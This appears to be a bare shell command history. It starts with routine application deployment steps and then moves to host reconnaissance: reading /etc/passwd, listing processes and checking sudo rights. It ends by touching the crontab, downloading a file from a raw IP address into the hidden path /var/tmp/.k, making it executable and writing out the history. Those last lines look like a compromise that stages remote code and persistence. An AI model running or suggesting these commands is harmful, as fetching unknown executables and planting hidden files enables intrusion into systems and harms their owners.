git pull
tail -f /var/log/app/app.log
cd app
sudo systemctl restart app
systemctl status app
ls
make deploy
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
crontab -
wget -q http://212.206.223.10/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
